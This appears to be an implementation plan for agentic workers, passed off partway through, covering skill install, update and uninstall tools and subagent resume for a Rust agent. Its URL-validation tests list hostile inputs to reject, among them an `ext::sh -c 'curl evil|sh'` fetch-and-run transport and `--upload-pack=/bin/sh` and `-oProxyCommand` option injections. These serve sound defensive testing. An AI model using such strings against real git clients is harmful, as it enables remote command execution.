# Skills and Subagent Resume Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** let the agent discover, install, update and load skill definitions from
a checkout on the editor's machine, and let a subagent be resumed by handle.

**Architecture:** Four client-side tools (`skill`, `skill_install`,
`skill_update`, `skill_uninstall`) reach the editor through the existing
`AcpClient` trait; the skills directory is resolved by a fixed shell script run
on the client, never from server configuration. Subagent resume stores each
child's history in a new workspace-external cache modelled on `DigestCache`.

**Tech Stack:** Rust 2024, `tokio`, `async_trait`, `serde_yaml` (already a
dependency), `agent-client-protocol` 2.0.0.

**Spec:** `docs/superpowers/specs/2026-09-02-skills-and-subagent-resume-design.md`

## Global Constraints

- Branch `feat/skills`, cut from `main`. All work in `sapphire-agent/`.
- **`src/agent.rs` may be read but never edited.** It calls
  `visible_tool_predicate` with five arguments; that signature must not change.
- **CI gate: `cargo clippy --workspace -- -D warnings`, WITHOUT
  `--all-targets`.** `--all-targets` compiles test code whose call sites mask
  unused-item warnings, so a branch can be green locally and red in CI.
- **Never commit `Cargo.lock`.** It drifts on every cargo run; `git checkout --
  Cargo.lock` before every `git add`.
- Run cargo in the **foreground**, one process at a time. This host's OS is on a
  thermally-throttling USB SSD. Iterate with `cargo test -p sapphire-agent`,
  never `cargo check`.
- `cli_device::tests::add_turns_expires_in_into_an_absolute_time` is a known
  pre-existing wall-clock flake (#197). If only that fails, re-run it alone.
- Exact values that must not be paraphrased: tool names `skill`,
  `skill_install`, `skill_update`, `skill_uninstall`; kinds `Read`, `Execute`,
  `Execute`, `Delete`; `max_history_bytes` default `8_388_608`; `retain_days`
  default `7`; env override name `SAPPHIRE_AGENT_SKILLS_DIR`.
- Only `https://` sources. Reject `ext::`, `file://`, `git://`, `ssh://`,
  scp-like `user@host:path`, and any string starting with `-`.
- Every `git` invocation runs with `GIT_TERMINAL_PROMPT=0`.

---

## File Structure

| File | Responsibility |
|---|---|
| `src/tools/client_exec.rs` *(new)* | One-shot "run a command on the client and collect its output" — the reserve/create/track/wait/release dance, extracted from `ClientShell` so four new tools do not each re-implement it. |
| `src/skills.rs` *(new)* | Pure logic: the two resolver scripts as constants, parsing their output, validating a source URL, deriving and validating a destination name. No I/O, no ACP. |
| `src/tools/skill_tools.rs` *(new)* | The four tools. Thin: they call `client_exec` and `skills`. |
| `src/subagent_cache.rs` *(new)* | Child histories, keyed by handle, outside the workspace. Modelled on `src/digest_cache.rs`. |
| `src/tools/subagent.rs` | Gains the `resume` path and the handle line. |
| `src/serve/mod.rs` | One arm in `visible_tool_predicate`; the namespace gate composed at the `run_llm_turn` call site. |
| `src/config.rs` | `MemoryNamespaceConfig::skills`; `[subagent_cache]`. |
| `src/main.rs` | Registration and cache wiring. |
| `README.md` | Operator documentation. |

**Why `client_exec.rs` is its own file:** `client_tools.rs` is already large, and
the terminal lifecycle is the subtlest code on the branch — a cancelled call must
not leak a reservation, and a finished command's output must not be discarded
because the release that follows failed. It earns one file and one test module.

---

## Task 1: Extract the one-shot client command runner

**Files:**
- Create: `src/tools/client_exec.rs`
- Modify: `src/tools/mod.rs` (add `pub mod client_exec;`)
- Modify: `src/tools/client_tools.rs` — `ClientShell::execute` delegates

**Interfaces:**
- Produces:
  ```rust
  pub(crate) struct ClientRun {
      pub output: String,
      pub exit_code: Option<i32>,
      /// Set when the command outlived `timeout` and was left running.
      pub timed_out_handle: Option<TerminalHandle>,
  }

  pub(crate) async fn run_client_command(
      client: &std::sync::Arc<dyn crate::tools::acp_client::AcpClient>,
      command: &str,
      args: &[String],
      cwd: Option<&str>,
      timeout: std::time::Duration,
  ) -> anyhow::Result<ClientRun>;
  ```

**This task adds no new tests, by design.** Its deliverable is that behaviour is
unchanged, and the existing `client_tools` suite is what asserts that. A test
written against the extracted shape would only pin the extraction to itself.
Recorded here so a reviewer's "no tests added" finding can be adjudicated
against this rather than relitigated.

- [ ] **Step 1: Read the code being moved**

Read `src/tools/client_tools.rs`, `ClientShell::execute` in full. Note in
particular the four comments explaining *why* each step is ordered as it is —
the reservation's `Drop`, tracking before anything fallible, keeping output when
release fails, and leaving a timed-out handle tracked. **Every one of those
comments moves with the code, verbatim.** They are the record of four separate
review findings.

- [ ] **Step 2: Create `src/tools/client_exec.rs` with the extracted function**

Move the body verbatim. The only changes permitted are: taking `command`,
`args`, `cwd`, `timeout` as parameters instead of reading them from `input`; and
returning `ClientRun` instead of a formatted string. Formatting (`format_finished`
and the timeout message) stays in `client_tools.rs` — this task moves mechanism,
not presentation.

- [ ] **Step 3: Make `ClientShell::execute` delegate**

```rust
let run = crate::tools::client_exec::run_client_command(
    &client, command, &args, cwd, timeout,
).await?;
match run.timed_out_handle {
    None => Ok(format_finished(&run.output, run.exit_code)),
    Some(h) => Ok(format_timed_out(&h, &run.output)),
}
```

- [ ] **Step 4: Run the suite**

Run: `cargo test -p sapphire-agent`
Expected: PASS, with the same count as before the task. Any change in count
means this was not a pure extraction.

- [ ] **Step 5: Verify the diff is mechanical**

Run: `git diff -U10`
Read it and confirm every hunk is a move, a parameter substitution, or the
return-type change. If a comment was dropped or reworded, restore it.

- [ ] **Step 6: Commit**

```bash
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add src/tools/client_exec.rs src/tools/client_tools.rs src/tools/mod.rs
git commit -m "refactor(tools): extract the one-shot client command runner"
```

---

## Task 2: Skills resolution and validation logic

**Files:**
- Create: `src/skills.rs`
- Modify: `src/main.rs` (add `mod skills;`)

**Interfaces:**
- Produces:
  ```rust
  pub struct SkillEntry { pub name: String, pub description: String, pub path: String }
  pub struct SkillIndex { pub dir: String, pub skills: Vec<SkillEntry> }

  pub const RESOLVE_AND_INDEX_SH: &str;   // used by `skill`
  pub const RESOLVE_OR_CREATE_SH: &str;   // used by `skill_install`

  pub fn parse_index(stdout: &str) -> anyhow::Result<SkillIndex>;
  pub fn parse_resolved_dir(stdout: &str) -> anyhow::Result<String>;
  pub fn validate_source_url(url: &str) -> anyhow::Result<()>;
  pub fn destination_name(url: &str) -> anyhow::Result<String>;
  pub fn validate_entry_name(name: &str) -> anyhow::Result<()>;
  ```

This task is pure functions over strings. Everything here is unit-testable with
no client, no filesystem and no async.

- [ ] **Step 1: Write the failing tests**

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_index_parses_a_directory_and_both_layouts() {
        let out = "SKILLS_DIR\t/home/u/.local/share/sapphire-agent/skills\n\
                   SKILL\t/home/u/.local/share/sapphire-agent/skills/local-thing/SKILL.md\n\
                   FM\tname: local-thing\n\
                   FM\tdescription: a hand-written one\n\
                   SKILL\t/home/u/.local/share/sapphire-agent/skills/superpowers/skills/brainstorming/SKILL.md\n\
                   FM\tname: brainstorming\n\
                   FM\tdescription: \"You MUST use this before any creative work\"\n";
        let idx = parse_index(out).unwrap();
        assert_eq!(idx.dir, "/home/u/.local/share/sapphire-agent/skills");
        assert_eq!(idx.skills.len(), 2);
        assert_eq!(idx.skills[0].name, "local-thing");
        // The quoted form must survive: superpowers quotes several
        // descriptions, and a naive `split(": ")` would keep the quotes.
        assert_eq!(
            idx.skills[1].description,
            "You MUST use this before any creative work"
        );
    }

    #[test]
    fn no_directory_is_a_distinct_error_not_an_empty_index() {
        let err = parse_index("NO_SKILLS_DIR\n").unwrap_err().to_string();
        assert!(err.contains("SAPPHIRE_AGENT_SKILLS_DIR"), "got: {err}");
        assert!(err.contains("skill_install"), "got: {err}");
    }

    #[test]
    fn a_skill_whose_frontmatter_lacks_a_name_is_skipped_not_fatal() {
        let out = "SKILLS_DIR\t/s\n\
                   SKILL\t/s/broken/SKILL.md\n\
                   FM\tdescription: no name here\n\
                   SKILL\t/s/ok/SKILL.md\n\
                   FM\tname: ok\n\
                   FM\tdescription: fine\n";
        let idx = parse_index(out).unwrap();
        assert_eq!(idx.skills.len(), 1);
        assert_eq!(idx.skills[0].name, "ok");
    }

    #[test]
    fn only_https_sources_are_accepted() {
        assert!(validate_source_url("https://github.com/obra/superpowers").is_ok());
        for bad in [
            "ext::sh -c 'curl evil|sh'",
            "file:///etc",
            "git://github.com/x/y",
            "ssh://git@github.com/x/y",
            "git@github.com:x/y.git",
            "--upload-pack=/bin/sh",
            "-oProxyCommand=x",
            "http://github.com/x/y",
        ] {
            assert!(validate_source_url(bad).is_err(), "accepted {bad}");
        }
    }

    #[test]
    fn destination_names_are_derived_and_sanitised() {
        assert_eq!(destination_name("https://github.com/obra/superpowers").unwrap(), "superpowers");
        assert_eq!(destination_name("https://github.com/obra/superpowers.git").unwrap(), "superpowers");
        assert_eq!(destination_name("https://github.com/obra/superpowers/").unwrap(), "superpowers");
        // `CON` is three ordinary ASCII letters, so an alphanumeric
        // allow-list does not exclude it. Ruling that it did was wrong
        // once already, during the client-side tools work.
        assert!(destination_name("https://example.com/x/con").is_err());
        assert!(destination_name("https://example.com/x/CON.git").is_err());
        assert!(destination_name("https://example.com/x/..").is_err());
        assert!(destination_name("https://example.com/").is_err());
    }

    #[test]
    fn entry_names_cannot_escape_the_skills_directory() {
        assert!(validate_entry_name("superpowers").is_ok());
        for bad in ["..", ".", "", "a/b", "a\\b", "/abs", "-x", "nul", "COM1"] {
            assert!(validate_entry_name(bad).is_err(), "accepted {bad}");
        }
    }
}
```

- [ ] **Step 2: Run them and watch them fail**

Run: `cargo test -p sapphire-agent skills::`
Expected: FAIL — the module does not exist.

- [ ] **Step 3: Write the two scripts as constants**

Both are `sh`, both are compile-time constants, and **neither takes any
interpolated value from the agent.** Candidates are expanded by the client's own
shell, which is the only thing that knows that machine's layout.

```rust
/// Resolve the skills directory and index it, in one round trip.
///
/// The candidate order mirrors `directories::BaseDirs::data_dir()`,
/// which `init_app_ctx` already uses for this crate's own directories
/// on the server side. `-d` gates every candidate, so the list is safe
/// to try in the same order on every platform: a macOS path simply
/// does not exist on Linux.
///
/// Frontmatter is emitted raw, one `FM` line per line of it, and parsed
/// by `serde_yaml` in `parse_index`. Parsing YAML in `sed` would break
/// on the quoted descriptions superpowers actually ships.
pub const RESOLVE_AND_INDEX_SH: &str = r#"
set -u
for d in "${SAPPHIRE_AGENT_SKILLS_DIR:-}" \
         "${APPDATA:-}/sapphire-agent/skills" \
         "${HOME:-}/Library/Application Support/sapphire-agent/skills" \
         "${XDG_DATA_HOME:-${HOME:-}/.local/share}/sapphire-agent/skills"
do
  case "$d" in ""|"/sapphire-agent/skills") continue ;; esac
  [ -d "$d" ] || continue
  printf 'SKILLS_DIR\t%s\n' "$d"
  for f in "$d"/*/SKILL.md "$d"/*/skills/*/SKILL.md; do
    [ -f "$f" ] || continue
    printf 'SKILL\t%s\n' "$f"
    awk 'NR==1 && $0=="---" {inside=1; next}
         inside && $0=="---" {exit}
         inside {print "FM\t" $0}' "$f"
  done
  exit 0
done
printf 'NO_SKILLS_DIR\n'
"#;

/// Resolve the skills directory for writing, creating it when absent.
/// Used only by `skill_install`, which is the one operation allowed to
/// bring the directory into existence.
pub const RESOLVE_OR_CREATE_SH: &str = r#"
set -eu
if [ -n "${SAPPHIRE_AGENT_SKILLS_DIR:-}" ]; then
  d="$SAPPHIRE_AGENT_SKILLS_DIR"
elif [ -n "${APPDATA:-}" ]; then
  d="$APPDATA/sapphire-agent/skills"
elif [ -d "${HOME:-}/Library/Application Support" ]; then
  d="$HOME/Library/Application Support/sapphire-agent/skills"
else
  d="${XDG_DATA_HOME:-${HOME:-}/.local/share}/sapphire-agent/skills"
fi
mkdir -p "$d"
printf 'SKILLS_DIR\t%s\n' "$d"
"#;
```

The `case` guard exists because `"${APPDATA:-}/sapphire-agent/skills"` collapses
to `/sapphire-agent/skills` when `APPDATA` is unset, which on a Unix box is an
absolute path that could conceivably exist. Skipping that exact string costs
nothing and closes it.

- [ ] **Step 4: Write the parsers and validators**

```rust
pub fn parse_index(stdout: &str) -> anyhow::Result<SkillIndex> {
    let mut dir: Option<String> = None;
    let mut skills = Vec::new();
    let mut current: Option<(String, Vec<String>)> = None;

    // Flush whatever skill was being accumulated. A definition with no
    // parseable `name` is skipped rather than fatal: one malformed file
    // in someone's checkout must not remove every other skill, which is
    // the same rule `load_agents_dir` follows.
    fn flush(cur: Option<(String, Vec<String>)>, out: &mut Vec<SkillEntry>) {
        let Some((path, fm_lines)) = cur else { return };
        let fm = fm_lines.join("\n");
        let map = crate::frontmatter::parse_mapping(&fm);
        let get = |k: &str| map.get(serde_yaml::Value::from(k))
            .and_then(|v| v.as_str())
            .map(str::to_string);
        match get("name") {
            Some(name) if !name.is_empty() => out.push(SkillEntry {
                name,
                description: get("description").unwrap_or_default(),
                path,
            }),
            _ => tracing::warn!("skill at {path} has no usable `name`; skipping"),
        }
    }

    for line in stdout.lines() {
        if line == "NO_SKILLS_DIR" {
            anyhow::bail!(
                "no skills directory found on the editor's machine. Tried \
                 $SAPPHIRE_AGENT_SKILLS_DIR, $APPDATA/sapphire-agent/skills, \
                 ~/Library/Application Support/sapphire-agent/skills and \
                 ${{XDG_DATA_HOME:-~/.local/share}}/sapphire-agent/skills. \
                 Use skill_install to create it and install a skill source, \
                 or set SAPPHIRE_AGENT_SKILLS_DIR to an existing checkout."
            );
        }
        if let Some(d) = line.strip_prefix("SKILLS_DIR\t") {
            dir = Some(d.to_string());
        } else if let Some(p) = line.strip_prefix("SKILL\t") {
            flush(current.take(), &mut skills);
            current = Some((p.to_string(), Vec::new()));
        } else if let Some(fm) = line.strip_prefix("FM\t")
            && let Some((_, lines)) = current.as_mut()
        {
            lines.push(fm.to_string());
        }
    }
    flush(current.take(), &mut skills);

    let dir = dir.context("resolver produced no SKILLS_DIR line")?;
    skills.sort_by(|a, b| a.name.cmp(&b.name));
    Ok(SkillIndex { dir, skills })
}
```

`validate_source_url` rejects, in this order: an empty string; anything starting
with `-`; anything not starting with the exact prefix `https://`. Checking the
prefix positively means `ext::`, `file://`, `git://`, `ssh://` and the scp-like
`user@host:path` are all excluded by the same clause rather than by an
enumeration that could miss one.

`destination_name` takes the URL's final non-empty path segment, strips a
trailing `.git`, then runs `validate_entry_name`.

`validate_entry_name` reuses the rule `DigestCache::path_for` already
establishes — read that function and its doc first, and match it:

```rust
const RESERVED_WINDOWS_NAMES: &[&str] = &[
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6",
    "COM7", "COM8", "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6",
    "LPT7", "LPT8", "LPT9",
];

pub fn validate_entry_name(name: &str) -> anyhow::Result<()> {
    let reserved = RESERVED_WINDOWS_NAMES
        .iter()
        .any(|n| n.eq_ignore_ascii_case(name));
    if name.is_empty()
        || name == "."
        || name == ".."
        || name.starts_with('-')
        || reserved
        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
    {
        anyhow::bail!("'{name}' is not usable as a skills directory entry");
    }
    Ok(())
}
```

- [ ] **Step 5: Run the tests**

Run: `cargo test -p sapphire-agent skills::`
Expected: PASS, 6 tests.

- [ ] **Step 6: Test the scripts against a fixture tree**

The scripts are shell running on someone else's machine, so asserting on Rust
that never evaluates them proves nothing.

**These go in `src/skills.rs`'s own `#[cfg(test)] mod tests`, not in `tests/`.**
This crate is a binary with no `lib.rs` (`Cargo.toml` declares only `[[bin]]`),
so an integration test cannot reach `sapphire_agent::skills` at all. Drop the
`sapphire_agent::` prefixes accordingly.

```rust
use std::process::Command;

fn sh() -> Option<&'static str> {
    for c in ["sh", "bash"] {
        if Command::new(c).arg("-c").arg("exit 0").status().is_ok() {
            return Some(c);
        }
    }
    None
}

#[test]
fn the_resolver_finds_both_layouts_under_the_env_override() {
    let Some(sh) = sh() else { return };
    let tmp = tempfile::tempdir().unwrap();
    let skills = tmp.path().join("skills");
    std::fs::create_dir_all(skills.join("local-thing")).unwrap();
    std::fs::write(
        skills.join("local-thing/SKILL.md"),
        "---\nname: local-thing\ndescription: hand written\n---\n\nbody\n",
    ).unwrap();
    std::fs::create_dir_all(skills.join("bundle/skills/brainstorming")).unwrap();
    std::fs::write(
        skills.join("bundle/skills/brainstorming/SKILL.md"),
        "---\nname: brainstorming\ndescription: \"quoted one\"\n---\n\nbody\n",
    ).unwrap();

    let out = Command::new(sh)
        .arg("-c")
        .arg(sapphire_agent::skills::RESOLVE_AND_INDEX_SH)
        .env("SAPPHIRE_AGENT_SKILLS_DIR", &skills)
        .output()
        .unwrap();
    let stdout = String::from_utf8(out.stdout).unwrap();
    let idx = sapphire_agent::skills::parse_index(&stdout).unwrap();
    assert_eq!(idx.skills.len(), 2, "stdout was:\n{stdout}");
    assert_eq!(idx.skills[0].name, "brainstorming");
    assert_eq!(idx.skills[0].description, "quoted one");
    assert_eq!(idx.skills[1].name, "local-thing");
}

#[test]
fn the_resolver_reports_absence_rather_than_guessing() {
    let Some(sh) = sh() else { return };
    let tmp = tempfile::tempdir().unwrap();
    let out = Command::new(sh)
        .arg("-c")
        .arg(sapphire_agent::skills::RESOLVE_AND_INDEX_SH)
        .env("SAPPHIRE_AGENT_SKILLS_DIR", tmp.path().join("nope"))
        .env_remove("APPDATA")
        .env("HOME", tmp.path())
        .env("XDG_DATA_HOME", tmp.path().join("xdg"))
        .output()
        .unwrap();
    assert_eq!(String::from_utf8(out.stdout).unwrap().trim(), "NO_SKILLS_DIR");
}
```

Both tests return early where no `sh` is on `PATH`, because the assertion is
about the script, not about the machine running the suite. On this Windows host
Git Bash provides `sh`, so they do run here.

- [ ] **Step 7: Run and commit**

```bash
cargo test -p sapphire-agent
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add src/skills.rs src/main.rs tests/
git commit -m "feat(skills): resolve and index a client-side skills directory"
```

---

## Task 3: The `skill` tool, its gate, and registration

**Files:**
- Create: `src/tools/skill_tools.rs`
- Modify: `src/tools/mod.rs`, `src/serve/mod.rs`, `src/config.rs`, `src/main.rs`

**Interfaces:**
- Consumes: `client_exec::run_client_command`, `skills::{RESOLVE_AND_INDEX_SH,
  parse_index, SkillIndex}`
- Produces: `pub struct SkillTool` with `SkillTool::new()`; a per-session cache
  of the resolved `SkillIndex`.

- [ ] **Step 1: Add the namespace switch to config**

In `src/config.rs`, `MemoryNamespaceConfig` gains:

```rust
    /// Whether conversations under this namespace are offered the
    /// skill tools. Off by default: `using-superpowers` asks the model
    /// to check for a relevant skill before answering at all, which is
    /// right for development and wrong for an ordinary conversation.
    #[serde(default)]
    pub skills: bool,
```

- [ ] **Step 2: Write the failing gate tests**

In `src/serve/mod.rs`'s existing `visible_tool_predicate` test module:

```rust
#[test]
fn skill_tools_need_a_client_with_a_terminal() {
    // Channels reach `visible_tool_predicate` with every client flag
    // false (see `src/agent.rs`), so gating on the terminal capability
    // is also what keeps skills off Matrix and Discord — without
    // changing this function's signature, which `src/agent.rs` calls
    // and which this branch may not edit.
    let none = visible_tool_predicate(false, false, false, false, false);
    for t in ["skill", "skill_install", "skill_update", "skill_uninstall"] {
        assert!(!none(t), "{t} offered with no client");
    }
    let full = visible_tool_predicate(false, true, true, true, true);
    for t in ["skill", "skill_install", "skill_update", "skill_uninstall"] {
        assert!(full(t), "{t} hidden from a fully capable editor");
    }
    let no_term = visible_tool_predicate(false, true, true, true, false);
    assert!(!no_term("skill"), "skill offered without a terminal");
}
```

- [ ] **Step 3: Run it, watch it fail**

Run: `cargo test -p sapphire-agent skill_tools_need_a_client`
Expected: FAIL — `skill` currently falls through to `_ => true`.

- [ ] **Step 4: Add the arm**

In `visible_tool_predicate`, beside the existing client arms:

```rust
            // The skills directory lives on the editor's machine and is
            // located by running a script there, so every skill tool
            // needs both a client and its terminal. Listing a directory
            // is not expressible in ACP at all — there is no list, glob
            // or stat in the agent→client surface — which is why even
            // the read-only `skill` depends on the terminal.
            "skill" | "skill_install" | "skill_update" | "skill_uninstall" => {
                has_client && client_terminal
            }
```

- [ ] **Step 5: Compose the namespace gate at the call site**

In `run_llm_turn`, at the `specs_filtered(visible_tool_predicate(...))` call
(around `src/serve/mod.rs:2844`). `namespace` is already in scope, computed
around line 2770.

```rust
    // Skills are additionally gated on the turn's namespace. This is
    // composed here rather than added as a sixth parameter to
    // `visible_tool_predicate`, because that function is also called
    // from `src/agent.rs`, which this branch may not edit. The channel
    // path needs no namespace check anyway: it passes every client flag
    // as false, so the arm above already hides all four tools there.
    let skills_enabled = state
        .config
        .memory_namespaces
        .get(&namespace)
        .map(|ns| ns.skills)
        .unwrap_or(false);
    let base = visible_tool_predicate(
        host_access_enabled,
        has_client,
        client_fs_read,
        client_fs_write,
        client_terminal,
    );
    let tool_specs = state
        .tools
        .specs_filtered(move |name: &str| {
            if !base(name) {
                return false;
            }
            if !skills_enabled
                && matches!(name, "skill" | "skill_install" | "skill_update" | "skill_uninstall")
            {
                return false;
            }
            true
        })
        .await;
```

Use the exact four-name match shown, not `starts_with("skill")`. No registered
tool name begins with `skill` today, so the prefix would work — but it silently
claims every future name in that space, and a tool accidentally caught by it
would vanish from every namespace that has not opted into skills, which is a
hard failure to diagnose from the symptom.

- [ ] **Step 6: Write the `SkillTool` tests**

In `src/tools/skill_tools.rs`, using the `FakeClient` in
`src/tools/acp_client.rs::tests`:

```rust
#[tokio::test]
async fn the_index_is_resolved_once_and_reused() {
    // Two calls, one resolver invocation: the directory does not move
    // during a session, and re-running a shell script per skill load
    // would cost a round trip each time.
    let client = fake_client_returning(INDEX_STDOUT);
    let tool = SkillTool::new();
    scope_acp_client(client.clone(), async {
        tool.execute(&json!({})).await.unwrap();
        tool.execute(&json!({"name": "brainstorming"})).await.unwrap();
    }).await;
    assert_eq!(client.terminal_count(), 1);
}

#[tokio::test]
async fn loading_a_skill_prefixes_its_absolute_directory() {
    // Skills reference siblings by relative path — `./implementer-prompt.md`,
    // `scripts/task-brief`. Without this header every one of those is dead.
    let out = load_skill("brainstorming").await;
    assert!(
        out.contains("/skills/bundle/skills/brainstorming"),
        "no directory header in: {out}"
    );
}

#[tokio::test]
async fn a_refused_fs_read_falls_back_to_the_terminal() {
    // An editor may scope `fs/read_text_file` to the open project, and
    // the skills checkout is deliberately outside it. The fallback is
    // the path we expect to take, not a belt-and-braces extra.
    let client = fake_client_where_fs_read_fails(INDEX_STDOUT, "body from cat");
    let out = load_skill_with(client, "brainstorming").await;
    assert!(out.contains("body from cat"));
}

#[tokio::test]
async fn an_unknown_name_lists_what_exists() {
    let out = load_skill("nope").await.unwrap_err().to_string();
    assert!(out.contains("brainstorming"), "got: {out}");
}

#[tokio::test]
async fn no_directory_is_reported_with_the_fix() {
    let err = index_with(fake_client_returning("NO_SKILLS_DIR\n")).await.unwrap_err();
    assert!(err.to_string().contains("skill_install"));
}
```

Extend `FakeClient` with whatever recording it needs (a terminal invocation
count, a switch making `read_text_file` fail). Keep it the single fake — do not
add a second one.

- [ ] **Step 7: Implement `SkillTool`**

`kind()` is `ToolKind::Read`. The description carries the discipline, because a
tool description reaches only the conversations where the tool is offered, while
`TOOLS.md` reaches every namespace:

```
Load a skill: a written procedure for a kind of work — planning, TDD,
debugging, code review, finishing a branch. Call with no arguments to list
what is available; call with a name to load one.

Before any engineering or creative work — writing a plan, changing code,
debugging, reviewing — check this list first and follow a skill if one
applies. Skills reference sibling files by relative path; the response
names the skill's directory so those can be read.
```

The resolved `SkillIndex` is cached per session, in an `Arc<Mutex<HashMap<..>>>`
keyed by whatever session identity `current_turn_context()` exposes; if no
session key is reachable, cache on the `SkillTool` itself and note in a comment
that a second connected editor would share it, which is wrong only if two
editors on different machines use one agent session — which cannot happen, since
a session belongs to one connection.

- [ ] **Step 8: Register it**

In `src/main.rs`, beside the `SubagentTool` registration (around line 440):

```rust
            // Registered unconditionally: unlike subagents there is
            // nothing to load at startup, because the directory lives
            // on the editor's machine and is resolved per session.
            // `visible_tool_predicate` plus the namespace switch decide
            // whether it is ever offered.
            tool_set
                .register_tool(Box::new(tools::skill_tools::SkillTool::new()))
                .await;
```

- [ ] **Step 9: Run and commit**

```bash
cargo test -p sapphire-agent
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add -A
git commit -m "feat(tools): add the skill tool, gated by namespace and client terminal"
```

---

## Task 4: `skill_install`, `skill_update`, `skill_uninstall`

**Files:**
- Modify: `src/tools/skill_tools.rs`, `src/main.rs`

**Interfaces:**
- Consumes: `skills::{RESOLVE_OR_CREATE_SH, parse_resolved_dir,
  validate_source_url, destination_name, validate_entry_name}`,
  `client_exec::run_client_command`

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test]
async fn install_refuses_every_non_https_source_before_running_anything() {
    // `git clone` against an `ext::` URL executes a command, so this
    // must be refused without a process ever starting — assert on the
    // client having been asked for nothing, not just on the error.
    for bad in ["ext::sh -c evil", "file:///etc", "git@github.com:x/y",
                "--upload-pack=/bin/sh", "http://x/y"] {
        let client = fake_client_returning("");
        let err = install_with(client.clone(), bad).await.unwrap_err();
        assert!(err.to_string().contains("https"), "{bad}: {err}");
        assert_eq!(client.terminal_count(), 0, "{bad} started a process");
    }
}

#[tokio::test]
async fn install_refuses_a_source_that_is_already_present() {
    let err = install_existing("https://github.com/obra/superpowers").await.unwrap_err();
    assert!(err.to_string().contains("skill_update"), "got: {err}");
}

#[tokio::test]
async fn update_rejects_a_stored_remote_that_is_not_https() {
    // `skill_install` only ever writes an https remote, but
    // `.git/config` is an ordinary file on the person's machine and
    // `git pull` against an `ext::` remote executes a command.
    let err = update_where_remote_is("ext::sh -c evil").await.unwrap_err();
    assert!(err.to_string().contains("https"), "got: {err}");
}

#[tokio::test]
async fn update_without_a_name_continues_past_one_failed_entry() {
    let out = update_all_where(&[("a", Ok("Already up to date.")),
                                 ("b", Err("Not possible to fast-forward")),
                                 ("c", Ok("Updating 1234..5678"))]).await.unwrap();
    assert!(out.contains("a"), "{out}");
    assert!(out.contains("b"), "{out}");
    assert!(out.contains("c"), "{out}");
}

#[tokio::test]
async fn uninstall_refuses_a_checkout_with_local_changes_unless_forced() {
    let err = uninstall_where_status("M skills/brainstorming/SKILL.md", false)
        .await.unwrap_err();
    assert!(err.to_string().contains("SKILL.md"), "got: {err}");
    assert!(uninstall_where_status("M skills/brainstorming/SKILL.md", true).await.is_ok());
}

#[tokio::test]
async fn uninstall_will_not_address_anything_outside_the_skills_directory() {
    for bad in ["..", "../../etc", "/etc", "a/b", "con"] {
        assert!(uninstall(bad).await.is_err(), "accepted {bad}");
    }
}
```

- [ ] **Step 2: Run them, watch them fail**

Run: `cargo test -p sapphire-agent skill_tools::`
Expected: FAIL — the three tools do not exist.

- [ ] **Step 3: Implement the three tools**

Kinds: `skill_install` and `skill_update` are `ToolKind::Execute`;
`skill_uninstall` is `ToolKind::Delete`. Getting these wrong changes what the
permission policy asks about, so set them deliberately.

**`AcpClient::create_terminal` takes `(command, args, cwd, output_byte_limit)`
and has no environment parameter** — confirmed against
`src/tools/acp_client.rs:91`. So `GIT_TERMINAL_PROMPT=0` is supplied by running
`env` as the command:

```rust
run_client_command(&client, "env", &[
    "GIT_TERMINAL_PROMPT=0".into(),
    "git".into(), /* … */
], None, timeout).await
```

Without it, a repository needing credentials prompts in a terminal the model
cannot answer, and the one-shot timeout becomes the only thing that ends the
call — a stall rather than a refusal.

Command shapes, with the URL after `--` so it cannot be reparsed as an option
even if a check is ever missed:

- install: `git clone --depth 1 -- <url> <dir>/<name>`
- update: `git -C <dir>/<name> pull --ff-only`
- update's remote check: `git -C <dir>/<name> remote get-url origin`, run
  **before** the pull and validated with `validate_source_url`
- uninstall's dirty check: `git -C <dir>/<name> status --porcelain`
- uninstall: `rm -rf <dir>/<name>` — only after `validate_entry_name` and only
  joined to the resolver's own output, never to a model-supplied path

`--depth 1` on the clone is deliberate: superpowers is 94 files but carries its
whole history, and nothing in this design reads past `HEAD`. `git pull
--ff-only` works against a shallow clone.

`skill_update` with no `name` enumerates the entries from the index's `dir` and
updates each, collecting per-entry results. One entry's failure does not stop
the others; the summary names every entry and what happened to it.

After any successful install, update or uninstall, **invalidate the cached
`SkillIndex`** so the next `skill()` re-resolves. Otherwise a freshly installed
skill stays invisible for the rest of the session.

- [ ] **Step 4: Run the tests**

Run: `cargo test -p sapphire-agent skill_tools::`
Expected: PASS.

- [ ] **Step 5: Register the three tools**

Beside `SkillTool` in `src/main.rs`.

- [ ] **Step 6: Commit**

```bash
cargo test -p sapphire-agent
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add -A
git commit -m "feat(tools): install, update and uninstall skills on the editor's machine"
```

---

## Task 5: The subagent cache

**Files:**
- Create: `src/subagent_cache.rs`
- Modify: `src/main.rs` (`mod subagent_cache;`, open it, wire pruning),
  `src/config.rs`

**Interfaces:**
- Produces:
  ```rust
  #[derive(serde::Serialize, serde::Deserialize)]
  pub struct StoredChild {
      pub agent: String,
      pub history: Vec<crate::provider::ChatMessage>,
      pub created_at: chrono::DateTime<chrono::Utc>,
      pub updated_at: chrono::DateTime<chrono::Utc>,
  }

  pub struct SubagentCache { /* dir: PathBuf, max_bytes: usize */ }
  impl SubagentCache {
      pub fn open(dir: PathBuf, max_bytes: usize) -> anyhow::Result<Arc<Self>>;
      pub fn default_dir() -> Option<PathBuf>;
      /// `Ok(false)` when the serialized history exceeds `max_bytes`:
      /// the caller returns the answer and says the child is not
      /// resumable. Never truncates.
      pub fn put(&self, handle: &str, child: &StoredChild) -> anyhow::Result<bool>;
      pub fn get(&self, handle: &str) -> Option<StoredChild>;
      pub fn remove(&self, handle: &str);
      pub fn prune_before(&self, cutoff: chrono::DateTime<chrono::Utc>) -> usize;
  }
  ```

- [ ] **Step 1: Read the model**

Read `src/digest_cache.rs` in full. This task is the same shape: the same
